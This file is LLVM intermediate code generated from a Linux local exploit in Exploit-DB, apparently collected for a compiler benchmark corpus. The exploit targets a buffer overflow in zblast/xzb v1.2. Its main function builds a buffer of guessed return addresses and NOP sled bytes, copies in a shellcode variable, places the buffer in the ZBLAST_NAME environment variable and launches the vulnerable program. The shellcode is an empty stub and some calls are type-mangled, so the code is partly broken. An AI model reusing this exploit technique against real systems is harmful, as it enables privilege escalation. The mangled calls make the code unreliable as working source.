; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_22745.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_22745.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [45 x i8] c"(*)zblast/xzb[v1.2]: local buffer overflow.\0A\00", align 1
@.str.1 = private unnamed_addr constant [44 x i8] c"(*)by: v9@fakehalo.deadpig.org / fakehalo.\0A\00", align 1
@DEFAULT_OFFSET = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [36 x i8] c"return address: 0x%lx, offset: %d.\0A\00", align 1
@exec = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [12 x i8] c"ZBLAST_NAME\00", align 1
@PATH = common dso_local global i8* null, align 8
@.str.4 = private unnamed_addr constant [25 x i8] c"* failed to execute %s.\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca [1040 x i8], align 16
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i64, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %10 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str, i64 0, i64 0))
  %11 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([44 x i8], [44 x i8]* @.str.1, i64 0, i64 0))
  %12 = load i32, i32* %4, align 4
  %13 = icmp sgt i32 %12, 1
  br i1 %13, label %14, label %19

14:                                               ; preds = %2
  %15 = load i8**, i8*** %5, align 8
  %16 = getelementptr inbounds i8*, i8** %15, i64 1
  %17 = load i8*, i8** %16, align 8
  %18 = call i32 @atoi(i8* %17)
  store i32 %18, i32* %8, align 4
  br label %21

19:                                               ; preds = %2
  %20 = load i32, i32* @DEFAULT_OFFSET, align 4
  store i32 %20, i32* %8, align 4
  br label %21

21:                                               ; preds = %19, %14
  %22 = call i32 (...) @esp()
  %23 = load i32, i32* %8, align 4
  %24 = sub nsw i32 %22, %23
  %25 = sext i32 %24 to i64
  store i64 %25, i64* %9, align 8
  %26 = load i64, i64* %9, align 8
  %27 = load i32, i32* %8, align 4
  %28 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.2, i64 0, i64 0), i64 %26, i32 %27)
  store i32 0, i32* %7, align 4
  br label %29

29:                                               ; preds = %39, %21
  %30 = load i32, i32* %7, align 4
  %31 = sext i32 %30 to i64
  %32 = icmp ult i64 %31, 1040
  br i1 %32, label %33, label %42

33:                                               ; preds = %29
  %34 = load i64, i64* %9, align 8
  %35 = load i32, i32* %7, align 4
  %36 = sext i32 %35 to i64
  %37 = getelementptr inbounds [1040 x i8], [1040 x i8]* %6, i64 0, i64 %36
  %38 = bitcast i8* %37 to i64*
  store i64 %34, i64* %38, align 1
  br label %39

39:                                               ; preds = %33
  %40 = load i32, i32* %7, align 4
  %41 = add nsw i32 %40, 4
  store i32 %41, i32* %7, align 4
  br label %29

42:                                               ; preds = %29
  store i32 0, i32* %7, align 4
  br label %43

43:                                               ; preds = %54, %42
  %44 = load i32, i32* %7, align 4
  %45 = load i32, i32* @exec, align 4
  %46 = call i32 @strlen(i32 %45)
  %47 = sub nsw i32 1000, %46
  %48 = icmp slt i32 %44, %47
  br i1 %48, label %49, label %57

49:                                               ; preds = %43
  %50 = getelementptr inbounds [1040 x i8], [1040 x i8]* %6, i64 0, i64 0
  %51 = load i32, i32* %7, align 4
  %52 = sext i32 %51 to i64
  %53 = getelementptr inbounds i8, i8* %50, i64 %52
  store i8 -112, i8* %53, align 1
  br label %54

54:                                               ; preds = %49
  %55 = load i32, i32* %7, align 4
  %56 = add nsw i32 %55, 1
  store i32 %56, i32* %7, align 4
  br label %43

57:                                               ; preds = %43
  %58 = getelementptr inbounds [1040 x i8], [1040 x i8]* %6, i64 0, i64 0
  %59 = load i32, i32* %7, align 4
  %60 = sext i32 %59 to i64
  %61 = getelementptr inbounds i8, i8* %58, i64 %60
  %62 = load i32, i32* @exec, align 4
  %63 = load i32, i32* @exec, align 4
  %64 = call i32 @strlen(i32 %63)
  %65 = call i32 @memcpy(i8* %61, i32 %62, i32 %64)
  %66 = getelementptr inbounds [1040 x i8], [1040 x i8]* %6, i64 0, i64 0
  %67 = call i32 @setenv(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.3, i64 0, i64 0), i8* %66, i32 1)
  %68 = load i8*, i8** @PATH, align 8
  %69 = load i8*, i8** @PATH, align 8
  %70 = call i64 @execlp(i8* %68, i8* %69, i32 0)
  %71 = icmp ne i64 %70, 0
  br i1 %71, label %72, label %75

72:                                               ; preds = %57
  %73 = load i8*, i8** @PATH, align 8
  %74 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.4, i64 0, i64 0), i8* %73)
  br label %75

75:                                               ; preds = %72, %57
  %76 = call i32 @exit(i32 0) #3
  unreachable
}

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @atoi(i8*) #1

declare dso_local i32 @esp(...) #1

declare dso_local i32 @strlen(i32) #1

declare dso_local i32 @memcpy(i8*, i32, i32) #1

declare dso_local i32 @setenv(i8*, i8*, i32) #1

declare dso_local i64 @execlp(i8*, i8*, i32) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
